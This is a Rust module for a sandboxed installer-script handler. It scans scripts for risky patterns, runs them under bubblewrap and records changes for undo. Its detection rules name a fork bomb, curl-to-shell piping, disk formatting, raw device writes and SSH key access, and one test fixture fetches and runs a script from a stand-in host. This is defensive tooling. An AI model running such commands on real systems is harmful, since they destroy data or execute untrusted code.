//! Installer scripts (.sh/.run/.bin): the "run anything without worrying"
//! handler.
//!
//! Safety comes in four layers, all automatic:
//!
//! 1. **Audit.** Before anything runs, readable scripts are scanned for
//!    risky patterns (deleting files, downloading code, asking for admin
//!    rights…). Every finding is explained in plain language.
//! 2. **Sandbox.** The installer runs under bubblewrap: no network unless
//!    you allow it, a read-only system, and only four folders writable
//!    (`~/.local`, `~/Applications`, `~/bin`, `~/.config`). Your SSH keys
//!    are hidden. If bubblewrap isn't installed, dropin refuses to run the
//!    script at all.
//! 3. **Undo.** Everything the installer adds, removes, or changes is
//!    recorded. Removing the app later puts everything back the way it was.
//! 4. **Logging.** Full output goes to a log file; you get a short
//!    plain-language report of what happened.

use super::{sha256_of, InstallOptions, InstallOutcome, InstallPlan};
use crate::{detect, Error, Result};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::io::{self, BufRead, IsTerminal, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, ExitStatus, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;

// ---------------------------------------------------------------------------
// Audit
// ---------------------------------------------------------------------------

/// How worried should the user be about this finding?
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Severity {
    /// Just so you know.
    Info,
    /// Worth a look before you continue.
    Warning,
    /// This could go badly. The sandbox and undo still protect you.
    Danger,
}

/// One thing the audit noticed, explained without jargon.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    pub title: String,
    pub detail: String,
    /// True when this finding means the installer needs the internet.
    pub needs_net: bool,
}

fn finding(severity: Severity, title: &str, detail: &str) -> Finding {
    Finding {
        severity,
        title: title.into(),
        detail: detail.into(),
        needs_net: false,
    }
}

/// Scan a readable installer script for risky patterns.
/// Returns plain-language findings, most severe first.
pub fn audit(src: &Path) -> Vec<Finding> {
    let text = match read_script_text(src) {
        Some(t) => t,
        None => {
            return vec![finding(
                Severity::Info,
                "Can't preview what this installer does",
                "It's a compiled program rather than a readable script, so dropin can't \
                 list its actions in advance. It will still run fully sandboxed, everything \
                 it changes will be logged, and you can undo it all afterwards.",
            )];
        }
    };
    let lower = text.to_lowercase();
    let mut out: Vec<Finding> = Vec::new();

    // --- Danger -----------------------------------------------------------
    if has_rm_rf(&lower) {
        out.push(finding(
            Severity::Danger,
            "Tries to delete files",
            "The script contains a recursive delete command. If it has a bug or a variable \
             is empty, it could wipe the wrong folder. The sandbox limits any damage to your \
             install folders, and undo can bring deleted files back.",
        ));
    }
    let pipes_to_shell = ["| sh", "|sh", "| bash", "|bash"]
        .iter()
        .any(|p| lower.contains(p));
    if (lower.contains("curl") || lower.contains("wget")) && pipes_to_shell {
        out.push(finding(
            Severity::Danger,
            "Downloads and runs code from the internet",
            "The script fetches something online and executes it immediately — the most \
             common way malicious software gets in. Only continue if you fully trust the source.",
        ));
    }
    if lower.contains("mkfs.") || lower.contains("mkfs ") {
        out.push(finding(
            Severity::Danger,
            "Tries to format a disk",
            "The script contains a disk-formatting command, which destroys everything on \
             a drive. The sandbox blocks access to disks, so this will fail safely.",
        ));
    }
    if lower.contains("of=/dev/") {
        out.push(finding(
            Severity::Danger,
            "Writes directly to a device",
            "The script writes raw data to a disk or device, which can destroy data. The \
             sandbox blocks device access, so this will fail safely.",
        ));
    }
    if lower.contains(":(){ :|:& };:") {
        out.push(finding(
            Severity::Danger,
            "Tries to crash your computer",
            "The script contains a 'fork bomb' that multiplies processes until the system \
             locks up. The sandbox contains it.",
        ));
    }
    if lower.contains("chmod") && (lower.contains("+s") || lower.contains("u+s")) {
        out.push(finding(
            Severity::Danger,
            "Gives a program extra privileges",
            "The script marks a program to run with elevated privileges. The sandbox \
             prevents this from taking effect outside the sandbox.",
        ));
    }

    // --- Warning ----------------------------------------------------------
    if lower.contains("sudo ") || lower.contains("\nsudo") {
        out.push(finding(
            Severity::Warning,
            "Asks for administrator access",
            "The script tries to use sudo. Dropin installs never need administrator \
             rights, and the sandbox has none to give — this step will fail.",
        ));
    }
    if has_system_path(&lower) {
        out.push(finding(
            Severity::Warning,
            "Tries to change system folders",
            "The script touches folders outside your home directory. Dropin keeps the \
             whole system read-only, so those steps will fail — the install may be incomplete.",
        ));
    }
    if lower.contains("crontab") || lower.contains("systemctl enable") || lower.contains(".config/autostart") {
        out.push(finding(
            Severity::Warning,
            "Sets itself to start automatically",
            "The script arranges to run in the background or at login. You'll see exactly \
             what it added in the report, and removing the app cleans it up.",
        ));
    }
    if lower.contains(".ssh") || lower.contains(".gnupg") || lower.contains("id_rsa") || lower.contains(".pem\"") {
        out.push(finding(
            Severity::Warning,
            "Looks at private keys",
            "The script references SSH or encryption keys. Dropin hides your real keys \
             from installers, so there's nothing for it to find.",
        ));
    }

    // --- Info -------------------------------------------------------------
    let mut net = finding(
        Severity::Info,
        "Downloads extra files from the internet",
        "The installer fetches additional files while it runs, so it needs internet \
         access. Dropin blocks the internet by default — you can allow it just for this install.",
    );
    net.needs_net = true;
    if (lower.contains("curl ") || lower.contains("\ncurl") || lower.contains("wget ") || lower.contains("\nwget"))
        && !out.iter().any(|f| f.title.contains("Downloads and runs code"))
    {
        out.push(net);
    }
    if lower.contains("makeself") {
        out.push(finding(
            Severity::Info,
            "Self-extracting installer",
            "This is a standard self-extracting package: it unpacks files and then runs \
             its own setup steps.",
        ));
    }

    if out.is_empty() {
        out.push(finding(
            Severity::Info,
            "Nothing unusual found",
            "The script doesn't do anything on dropin's risk list. It still runs \
             sandboxed, and everything it changes is logged and reversible.",
        ));
    }

    // Most severe first.
    out.sort_by_key(|f| match f.severity {
        Severity::Danger => 0,
        Severity::Warning => 1,
        Severity::Info => 2,
    });
    out
}

/// Read the first 256 KiB as text if it looks like a script.
fn read_script_text(src: &Path) -> Option<String> {
    let data = std::fs::read(src).ok()?;
    let head = &data[..data.len().min(256 * 1024)];
    // Binary if it contains NUL bytes.
    if head.contains(&0) {
        // Makeself .run files are shell scripts with a binary payload
        // appended — the head is still readable text.
        let text_head = head.iter().take_while(|&&b| b != 0).collect::<Vec<_>>();
        if text_head.len() < 200 {
            return None;
        }
        return String::from_utf8(text_head.into_iter().copied().collect()).ok();
    }
    String::from_utf8(head.to_vec()).ok()
}

/// Any recursive force-delete: always worth flagging, since an empty
/// variable (`rm -rf "$DIR/"`) turns it into a disaster.
fn has_rm_rf(lower: &str) -> bool {
    lower.lines().any(|line| {
        let line = line.trim();
        (line.contains("rm ") || line.starts_with("rm"))
            && (line.contains("-rf") || line.contains("-fr") || line.contains("--recursive"))
    })
}

/// System paths (/etc/, /usr/…) as real path starts — not `.local/bin/`
/// or `$HOME/...` which merely contain those substrings.
fn has_system_path(lower: &str) -> bool {
    const PREFIXES: [&str; 5] = ["/etc/", "/usr/", "/opt/", "/bin/", "/sbin/"];
    // Boundaries that can precede a real absolute path.
    const BOUNDARIES: [&str; 6] = [" ", "\"", "'", "=", ":", "\t"];
    lower.lines().any(|line| {
        let trimmed = line.trim_start();
        PREFIXES.iter().any(|p| {
            BOUNDARIES.iter().any(|b| line.contains(&format!("{b}{p}")))
                || trimmed.starts_with(p)
        })
    })
}

pub fn plan(src: &Path) -> Result<InstallPlan> {
    let d = detect::detect(src)?;
    Ok(InstallPlan {
        app_name: d.name_hint.clone(),
        version: None,
        steps: vec![
            "You confirm, then the vendor's installer runs sandboxed".into(),
            "Everything it changes is logged and fully reversible".into(),
            "dropin records it as an external install".into(),
        ],
        needs_root: false,
        needs_confirmation: true,
    })
}

// ---------------------------------------------------------------------------
// Sandbox
// ---------------------------------------------------------------------------

/// Folders an installer is allowed to write to. Everything else in $HOME
/// is read-only; your SSH keys are hidden entirely.
fn writable_roots() -> Vec<PathBuf> {
    let home = crate::home_dir();
    let mut roots = Vec::new();
    for rel in ["./.local", "./Applications", "./bin", "./.config"] {
        let p = home.join(rel.trim_start_matches("./"));
        let _ = std::fs::create_dir_all(&p);
        roots.push(p);
    }
    roots
}

/// Build the bubblewrap command for a vendor installer.
fn sandbox_command(src: &Path, allow_net: bool) -> Result<Command> {
    if !crate::have("bwrap") {
        return Err(Error::Refused(
            "bwrap (bubblewrap) is required to run installer scripts safely, but it isn't installed.\n\
             Install it for your distro (e.g. `apt install bubblewrap`) and try again."
                .into(),
        ));
    }
    let home = crate::home_dir();
    let home_s = home.to_string_lossy().to_string();
    let is_sh = src.extension().map(|e| e == "sh").unwrap_or(false);
    if !is_sh {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(src)?.permissions();
        perms.set_mode(perms.mode() | 0o755);
        std::fs::set_permissions(src, perms)?;
    }

    let mut cmd = Command::new("bwrap");
    // Namespaces: everything unshared; network only when allowed.
    cmd.args(["--unshare-user", "--unshare-ipc", "--unshare-pid", "--unshare-uts", "--unshare-cgroup"]);
    if !allow_net {
        cmd.arg("--unshare-net");
    }
    cmd.args(["--die-with-parent", "--new-session"]);
    // Base system, read-only. Symlinks cover usr-merged distros.
    cmd.args(["--ro-bind", "/usr", "/usr"]);
    for (link, target) in [("/bin", "usr/bin"), ("/lib", "usr/lib"), ("/lib64", "usr/lib64"), ("/sbin", "usr/sbin"), ("/lib32", "usr/lib32")] {
        cmd.args(["--symlink", target, link]);
    }
    cmd.args(["--ro-bind", "/etc", "/etc"]);
    // HOME read-only, then punch writable holes for the install folders.
    cmd.args(["--ro-bind", &home_s, &home_s]);
    for root in writable_roots() {
        let s = root.to_string_lossy().to_string();
        cmd.args(["--bind", &s, &s]);
    }
    // Hide secrets even from reading. (After the binds: later mounts win.)
    cmd.args(["--tmpfs", &format!("{home_s}/.ssh")]);
    cmd.args(["--tmpfs", &format!("{home_s}/.gnupg")]);
    cmd.args(["--tmpfs", "/tmp", "--proc", "/proc", "--dev", "/dev"]);
    if is_sh {
        cmd.arg("sh").arg(src);
    } else {
        cmd.arg(src);
    }
    Ok(cmd)
}

// ---------------------------------------------------------------------------
// Logging
// ---------------------------------------------------------------------------

fn log_dir() -> PathBuf {
    let d = crate::home_dir().join(".local/share/dropin/script-logs");
    let _ = std::fs::create_dir_all(&d);
    d
}

/// Callback for live installer output lines.
type LineCallback = Box<dyn FnMut(&str) + Send>;
/// Shared log file + live callback for the output pump threads.
type SharedLog = Arc<Mutex<(std::fs::File, Option<LineCallback>)>>;

/// Run `cmd`, streaming stdout/stderr to a log file (and to `on_line`).
/// Returns the exit status. `tag` names the log file.
fn run_and_log(
    cmd: &mut Command,
    tag: &str,
    on_line: Option<LineCallback>,
) -> Result<(ExitStatus, PathBuf)> {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let log_path = log_dir().join(format!("{tag}-{nanos}.log"));
    let file = std::fs::File::create(&log_path)?;
    let shared: SharedLog = Arc::new(Mutex::new((file, on_line)));

    let mut child = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| Error::Command(format!("starting sandboxed installer: {e}")))?;

    // Stdout and stderr both get pumped; types differ so handle separately.
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();
    let t1 = stdout.map(|p| {
        let shared = Arc::clone(&shared);
        thread::spawn(move || {
            let reader = io::BufReader::new(p);
            for line in reader.lines().map_while(|l| l.ok()) {
                if let Ok(mut guard) = shared.lock() {
                    let _ = writeln!(guard.0, "{line}");
                    if let Some(cb) = guard.1.as_mut() {
                        cb(&line);
                    }
                }
            }
        })
    });
    let t2 = stderr.map(|p| {
        let shared = Arc::clone(&shared);
        thread::spawn(move || {
            let reader = io::BufReader::new(p);
            for line in reader.lines().map_while(|l| l.ok()) {
                if let Ok(mut guard) = shared.lock() {
                    let _ = writeln!(guard.0, "{line}");
                    if let Some(cb) = guard.1.as_mut() {
                        cb(&line);
                    }
                }
            }
        })
    });
    let status = child
        .wait()
        .map_err(|e| Error::Command(format!("waiting for installer: {e}")))?;
    if let Some(t) = t1 {
        let _ = t.join();
    }
    if let Some(t) = t2 {
        let _ = t.join();
    }
    // Keep only the 5 newest logs per tag.
    prune_logs(tag);
    Ok((status, log_path))
}

fn prune_logs(tag: &str) {
    let mut logs: Vec<_> = std::fs::read_dir(log_dir())
        .into_iter()
        .flatten()
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| {
            p.file_name()
                .and_then(|n| n.to_str())
                .map(|n| n.starts_with(tag) && n.ends_with(".log"))
                .unwrap_or(false)
        })
        .collect();
    logs.sort();
    while logs.len() > 5 {
        std::fs::remove_file(logs.remove(0)).ok();
    }
}

// ---------------------------------------------------------------------------
// Snapshots, backup, undo
// ---------------------------------------------------------------------------

/// path -> (size, mtime). Symlinks tracked by presence.
type FileMap = BTreeMap<PathBuf, (u64, i64)>;

fn mtime_secs(m: &std::fs::Metadata) -> i64 {
    m.modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Snapshot every file in the writable install folders.
fn snapshot_writable() -> FileMap {
    let mut map = FileMap::new();
    for root in writable_roots() {
        for entry in walkdir::WalkDir::new(&root)
            .into_iter()
            .filter_map(|e| e.ok())
            .take(200_000)
        {
            let p = entry.path().to_path_buf();
            let ft = entry.file_type();
            if ft.is_file() {
                if let Ok(m) = entry.metadata() {
                    map.insert(p, (m.len(), mtime_secs(&m)));
                }
            } else if ft.is_symlink() {
                map.insert(p, (0, 0));
            }
        }
    }
    map
}

fn backup_root() -> PathBuf {
    let d = crate::home_dir().join(".cache/dropin/script-backup");
    let _ = std::fs::create_dir_all(&d);
    d
}

fn undo_path(slug: &str) -> PathBuf {
    let d = crate::home_dir().join(".local/share/dropin/undo");
    let _ = std::fs::create_dir_all(&d);
    d.join(format!("{slug}.json"))
}

/// Hardlink every snapshotted file into `dest` (same names, relative to $HOME).
/// Hardlinks are instant and share disk space until the installer changes them.
fn hardlink_snapshot(map: &FileMap, dest: &Path) -> Result<()> {
    let home = crate::home_dir();
    for path in map.keys() {
        let rel = match path.strip_prefix(&home) {
            Ok(r) => r,
            Err(_) => continue,
        };
        let target = dest.join(rel);
        if let Some(parent) = target.parent() {
            std::fs::create_dir_all(parent)?;
        }
        if std::fs::hard_link(path, &target).is_err() {
            // Cross-device or odd file: fall back to a copy.
            std::fs::copy(path, &target).ok();
        }
    }
    Ok(())
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Diff {
    pub added: Vec<PathBuf>,
    pub removed: Vec<PathBuf>,
    pub modified: Vec<PathBuf>,
}

fn diff_maps(before: &FileMap, after: &FileMap) -> Diff {
    let mut d = Diff::default();
    for (p, meta) in after {
        match before.get(p) {
            None => d.added.push(p.clone()),
            Some(old) if old != meta => d.modified.push(p.clone()),
            _ => {}
        }
    }
    for p in before.keys() {
        if !after.contains_key(p) {
            d.removed.push(p.clone());
        }
    }
    d.added.sort();
    d.removed.sort();
    d.modified.sort();
    d
}

/// Everything needed to undo a script install, and to explain it.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptReport {
    pub success: bool,
    pub added: Vec<PathBuf>,
    pub removed: Vec<PathBuf>,
    pub modified: Vec<PathBuf>,
    pub log_path: PathBuf,
    pub failure_hint: Option<String>,
    /// Was the internet allowed for this run?
    pub net_allowed: bool,
}

fn write_undo_record(slug: &str, report: &ScriptReport, backup_dir: &Path) -> Result<()> {
    #[derive(Serialize)]
    struct Record<'a> {
        backup_dir: &'a Path,
        report: &'a ScriptReport,
    }
    let json = serde_json::to_string_pretty(&Record { backup_dir, report })
        .map_err(|e| Error::Unsupported(format!("serializing undo record: {e}")))?;
    std::fs::write(undo_path(slug), json)?;
    Ok(())
}

/// Read the undo record for a script install, if one exists.
pub fn read_report(slug: &str) -> Option<ScriptReport> {
    #[derive(Deserialize)]
    struct Record {
        report: ScriptReport,
    }
    std::fs::read_to_string(undo_path(slug))
        .ok()
        .and_then(|t| serde_json::from_str::<Record>(&t).ok())
        .map(|r| r.report)
}

/// Undo everything a script installer did: delete what it added, bring back
/// what it deleted, restore what it changed. Returns a plain-language summary.
pub fn undo_install(slug: &str) -> Result<String> {
    #[derive(Deserialize)]
    struct Record {
        backup_dir: PathBuf,
        report: ScriptReport,
    }
    let text = std::fs::read_to_string(undo_path(slug))
        .map_err(|_| Error::NotInstalled(format!("no undo record for {slug}")))?;
    let rec: Record =
        serde_json::from_str(&text).map_err(|e| Error::Unsupported(format!("bad undo record: {e}")))?;
    let home = crate::home_dir();
    let mut restored = 0;

    // Bring back deleted files from the hardlink backup.
    for p in &rec.report.removed {
        let rel = match p.strip_prefix(&home) {
            Ok(r) => r,
            Err(_) => continue,
        };
        let src = rec.backup_dir.join(rel);
        if src.exists() {
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).ok();
            }
            // Rename breaks the hardlink (keeps our copy intact); fall back to copy.
            if std::fs::rename(&src, p).is_err() {
                std::fs::copy(&src, p).ok();
            }
            restored += 1;
        }
    }
    // Restore modified files from backup (best effort: in-place edits made
    // through the original path also changed the backup's copy).
    for p in &rec.report.modified {
        let rel = match p.strip_prefix(&home) {
            Ok(r) => r,
            Err(_) => continue,
        };
        let src = rec.backup_dir.join(rel);
        if src.exists() {
            std::fs::copy(&src, p).ok();
            restored += 1;
        }
    }
    // Remove what the installer added.
    let mut removed = 0;
    let mut added_sorted = rec.report.added.clone();
    added_sorted.sort_by_key(|p| std::cmp::Reverse(p.components().count()));
    for p in &added_sorted {
        if crate::ledger::remove_path(p).is_ok() {
            removed += 1;
        }
    }
    std::fs::remove_dir_all(&rec.backup_dir).ok();
    std::fs::remove_file(undo_path(slug)).ok();

    let mut parts = vec![format!("Undid the install: removed {removed} added file(s)")];
    if restored > 0 {
        parts.push(format!("brought back {restored} file(s) it had changed or deleted"));
    }
    Ok(parts.join(", ") + ".")
}

// ---------------------------------------------------------------------------
// Plain-language reporting
// ---------------------------------------------------------------------------

/// Explain a finished script install without jargon.
pub fn describe_report(app: &str, r: &ScriptReport) -> String {
    let mut lines: Vec<String> = Vec::new();
    if r.success {
        lines.push(format!("“{app}” installed successfully."));
        if !r.added.is_empty() {
            lines.push(format!(
                "It added {} new file{} to your install folders.",
                r.added.len(),
                if r.added.len() == 1 { "" } else { "s" }
            ));
        }
        let menu = r.added.iter().any(|p| {
            p.to_string_lossy().contains(".local/share/applications")
                && p.extension().and_then(|e| e.to_str()) == Some("desktop")
        });
        if menu {
            lines.push("You'll find it in your app menu.".into());
        } else if r.added.iter().any(|p| {
            let s = p.to_string_lossy();
            s.contains(".local/bin") || s.contains("/bin/") || p.extension().map(|e| e == "AppImage").unwrap_or(false)
        }) {
            lines.push("It didn't add a menu entry — look for its program files in ~/.local/bin.".into());
        }
        if !r.removed.is_empty() || !r.modified.is_empty() {
            lines.push(format!(
                "It also changed {} existing file{} — removing “{app}” will put everything back.",
                r.removed.len() + r.modified.len(),
                if r.removed.len() + r.modified.len() == 1 { "" } else { "s" }
            ));
        }
    } else {
        lines.push(format!("“{app}” didn't finish installing."));
        if let Some(hint) = &r.failure_hint {
            lines.push(hint.clone());
        } else {
            lines.push("The full log below has the technical details.".into());
        }
        if !r.net_allowed {
            lines.push("Tip: if it needed to download files, try again with internet access allowed.".into());
        }
    }
    lines.join("\n")
}

/// Guess what went wrong from the log, in plain language.
fn diagnose_failure(log_text: &str, net_allowed: bool) -> Option<String> {
    let lower = log_text.to_lowercase();
    if !net_allowed
        && (lower.contains("could not resolve host")
            || lower.contains("network is unreachable")
            || lower.contains("temporary failure in name resolution")
            || lower.contains("failed to connect"))
    {
        return Some(
            "It tried to reach the internet, which was blocked. Run it again and allow internet access.".into(),
        );
    }
    if lower.contains("sudo:") || lower.contains("password for") || lower.contains("[sudo]") {
        return Some(
            "It asked for an administrator password. Dropin never gives installers admin access, so it stopped here.".into(),
        );
    }
    if lower.contains("permission denied")
        && (lower.contains("/etc/") || lower.contains("/usr/") || lower.contains("/opt/"))
    {
        return Some(
            "It tried to change system files, which Dropin blocks to protect your system. It may need a different install method.".into(),
        );
    }
    if lower.contains("bwrap:") {
        return Some(
            "The sandbox itself hit a problem starting up. This is a Dropin issue rather than the installer's fault.".into(),
        );
    }
    None
}

// ---------------------------------------------------------------------------
// Install
// ---------------------------------------------------------------------------

fn confirm(app: &str, src: &Path, opts: &InstallOptions, findings: &[Finding]) -> Result<bool> {
    // Returns allow_net.
    let mut allow_net = opts.allow_net;
    let needs_net = findings.iter().any(|f| f.needs_net);
    let has_danger = findings.iter().any(|f| f.severity == Severity::Danger);

    if opts.yes {
        return Ok(allow_net);
    }
    if !opts.quiet {
        print_findings(findings);
    }
    let sha = sha256_of(src).unwrap_or_else(|_| "unavailable".into());
    let size = std::fs::metadata(src).map(|m| m.len()).unwrap_or(0);
    if !opts.quiet {
        println!("  file:   {}", src.display());
        println!("  size:   {size} bytes");
        println!("  sha256: {sha}");
        println!();
        println!("The installer will run sandboxed: no admin rights, and only your");
        println!("install folders are writable. Everything it does is logged and reversible.");
        println!();
    }
    if needs_net && !allow_net {
        allow_net = ask("This installer downloads extra files. Allow internet access just this once? [y/N]")?;
    }
    if has_danger {
        println!("Note: the audit above flagged risky behavior. The sandbox contains it,");
        println!("and removing the app afterwards undoes everything.");
    }
    if ask(&format!("Run the “{app}” installer? [y/N]"))? {
        Ok(allow_net)
    } else {
        Err(Error::Refused("installer declined by user".into()))
    }
}

fn ask(prompt: &str) -> Result<bool> {
    print!("{prompt} ");
    io::stdout().flush()?;
    let mut answer = String::new();
    io::stdin().read_line(&mut answer)?;
    Ok(answer.trim().eq_ignore_ascii_case("y"))
}

/// Print audit findings for the terminal, plain and simple.
pub fn print_findings(findings: &[Finding]) {
    println!("Safety check:");
    for f in findings {
        let mark = match f.severity {
            Severity::Info => "•",
            Severity::Warning => "!",
            Severity::Danger => "✗",
        };
        println!("  [{mark}] {}", f.title);
        println!("      {}", f.detail);
    }
    println!();
}

pub fn install(src: &Path, opts: &InstallOptions) -> Result<InstallOutcome> {
    let d = detect::detect(src)?;
    let slug = crate::slugify(&d.name_hint);
    let findings = audit(src);
    let allow_net = confirm(&d.name_hint, src, opts, &findings)?;

    // Snapshot before: what exists now, plus a hardlink backup for undo.
    if !opts.quiet {
        println!("Preparing a safety snapshot (so the install can be fully undone)…");
    }
    let before = snapshot_writable();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let backup_dir = backup_root().join(format!("{slug}-{nanos}"));
    std::fs::create_dir_all(&backup_dir)?;
    if let Err(e) = hardlink_snapshot(&before, &backup_dir) {
        eprintln!("warning: could not snapshot for undo ({e}); continuing without undo");
    }

    // Run sandboxed, logging everything.
    if !opts.quiet {
        println!("Running the installer (sandboxed{}):",
            if allow_net { ", internet allowed" } else { ", no internet" });
    }
    let mut cmd = sandbox_command(src, allow_net)?;
    // Live progress: show the latest line in place on interactive terminals.
    let interactive = !opts.quiet && io::stdin().is_terminal();
    let last_line = Arc::new(Mutex::new(String::new()));
    let cb_line = Arc::clone(&last_line);
    let on_line: Option<LineCallback> = if interactive {
        Some(Box::new(move |line: &str| {
            if let Ok(mut guard) = cb_line.lock() {
                *guard = line.chars().take(100).collect();
                eprint!("\r\x1b[K  {guard}");
                let _ = io::stderr().flush();
            }
        }))
    } else {
        None
    };
    // on_line must be 'static for the threads; rebuild without captures.
    let (status, log_path) = match run_and_log(&mut cmd, &slug, on_line) {
        Ok(r) => r,
        Err(e) => {
            std::fs::remove_dir_all(&backup_dir).ok();
            return Err(e);
        }
    };
    if interactive {
        eprintln!();
    }
    let success = status.success();

    // Diff, report, undo record.
    let after = snapshot_writable();
    let diff = diff_maps(&before, &after);
    let log_text = std::fs::read_to_string(&log_path).unwrap_or_default();
    let failure_hint = if success { None } else { diagnose_failure(&log_text, allow_net) };
    let report = ScriptReport {
        success,
        added: diff.added.clone(),
        removed: diff.removed.clone(),
        modified: diff.modified.clone(),
        log_path: log_path.clone(),
        failure_hint,
        net_allowed: allow_net,
    };
    // Keep the backup only if there's something to restore.
    if diff.removed.is_empty() && diff.modified.is_empty() {
        std::fs::remove_dir_all(&backup_dir).ok();
    }
    write_undo_record(&slug, &report, &backup_dir).ok();

    if !opts.quiet {
        println!();
        println!("{}", describe_report(&d.name_hint, &report));
        println!("Full log: {}", log_path.display());
    }

    if !success {
        // Offer a smart retry when the network was the likely blocker.
        if !allow_net && !opts.yes && !opts.quiet
            && report.failure_hint.as_deref().map(|h| h.contains("internet")).unwrap_or(false)
            && ask("Try again with internet access allowed? [y/N]")? {
                let mut retry_opts = opts.clone();
                retry_opts.allow_net = true;
                // Clean up this attempt's record first.
                std::fs::remove_file(undo_path(&slug)).ok();
                return install(src, &retry_opts);
            }
        return Err(Error::Command(format!(
            "installer exited with an error — {}",
            report.failure_hint.as_deref().unwrap_or("see the log for details")
        )));
    }

    Ok(InstallOutcome {
        name: slug,
        version: None,
        install_root: None,
        // Added files are tracked: `dropin remove` deletes them, and the
        // undo record restores anything the installer changed or deleted.
        paths: diff.added,
        external: true,
        update_info: None,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write_script(dir: &Path, name: &str, content: &str) -> PathBuf {
        let p = dir.join(name);
        std::fs::write(&p, content).unwrap();
        p
    }

    fn tmpdir(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("dropin-audit-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn audit_flags_dangerous_patterns() {
        let d = tmpdir("danger");
        let p = write_script(&d, "evil.sh", "#!/bin/sh\nrm -rf /tmp/junk\ncurl http://x.io/a.sh | sh\nsudo make me root\n");
        let findings = audit(&p);
        assert!(findings.iter().any(|f| f.severity == Severity::Danger && f.title.contains("delete")), "rm -rf flagged");
        assert!(findings.iter().any(|f| f.severity == Severity::Danger && f.title.contains("internet")), "curl|sh flagged");
        assert!(findings.iter().any(|f| f.severity == Severity::Warning && f.title.contains("administrator")), "sudo flagged");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn audit_detects_network_need() {
        let d = tmpdir("net");
        let p = write_script(&d, "dl.sh", "#!/bin/sh\ncurl -O http://example.com/data.tar.gz\ntar xzf data.tar.gz\n");
        let findings = audit(&p);
        assert!(findings.iter().any(|f| f.needs_net), "curl without pipe flagged as needs_net");
        assert!(!findings.iter().any(|f| f.severity == Severity::Danger), "plain curl is not danger");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn audit_clean_script_gets_all_clear() {
        let d = tmpdir("clean");
        let p = write_script(&d, "ok.sh", "#!/bin/sh\nmkdir -p \"$HOME/.local/bin\"\ncp myapp \"$HOME/.local/bin/\"\n");
        let findings = audit(&p);
        assert!(findings.iter().any(|f| f.title.contains("Nothing unusual")), "clean bill");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn audit_binary_reports_uninspectable() {
        let d = tmpdir("bin");
        let p = d.join("setup.bin");
        std::fs::write(&p, [0x7fu8, b'E', b'L', b'F', 0, 1, 2, 3]).unwrap();
        let findings = audit(&p);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].title.contains("Can't preview"));
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn diff_detects_added_removed_modified() {
        let mut before = FileMap::new();
        before.insert(PathBuf::from("/a/keep"), (10, 1));
        before.insert(PathBuf::from("/a/gone"), (10, 1));
        before.insert(PathBuf::from("/a/chg"), (10, 1));
        let mut after = FileMap::new();
        after.insert(PathBuf::from("/a/keep"), (10, 1));
        after.insert(PathBuf::from("/a/new"), (5, 2));
        after.insert(PathBuf::from("/a/chg"), (20, 2));
        let d = diff_maps(&before, &after);
        assert_eq!(d.added, vec![PathBuf::from("/a/new")]);
        assert_eq!(d.removed, vec![PathBuf::from("/a/gone")]);
        assert_eq!(d.modified, vec![PathBuf::from("/a/chg")]);
    }

    #[test]
    fn describe_report_is_plain_language() {
        let r = ScriptReport {
            success: true,
            added: vec![PathBuf::from("/x/.local/bin/foo")],
            removed: vec![],
            modified: vec![],
            log_path: PathBuf::from("/tmp/x.log"),
            failure_hint: None,
            net_allowed: false,
        };
        let text = describe_report("Foo", &r);
        assert!(text.contains("installed successfully"), "got: {text}");
        assert!(!text.to_lowercase().contains("sandbox"), "no jargon");
        let r2 = ScriptReport { success: false, failure_hint: Some("It tried to reach the internet, which was blocked.".into()), ..r };
        let text2 = describe_report("Foo", &r2);
        assert!(text2.contains("didn't finish"), "got: {text2}");
        assert!(text2.contains("internet"), "hint surfaced");
    }
}

